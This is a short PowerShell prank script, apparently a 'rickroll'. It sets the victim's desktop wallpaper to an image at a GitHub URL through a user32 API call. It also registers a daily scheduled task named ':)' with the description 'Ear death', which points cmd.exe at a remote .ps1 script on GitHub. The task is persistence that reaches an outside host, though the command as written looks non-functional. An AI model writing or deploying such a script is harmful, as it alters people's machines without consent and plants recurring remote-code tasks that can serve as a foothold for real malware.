$MyWallpaper="https://github.com/CHONK12/rickRoll/blob/main/rickroll.jpg"
$code = @'
using System.Runtime.InteropServices;
namespace Win32{

     public class Wallpaper{
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;

         public static void SetWallpaper(string thePath){
            SystemParametersInfo(20,0,thePath,3);
         }
    }
 }
'@

add-type $code
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument https://github.com/CHONK12/rickRoll/blob/main/Blue.ps1
$trigger = New-ScheduledTaskTrigger -Daily -At 3pm
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName ":)" -Description "Ear death"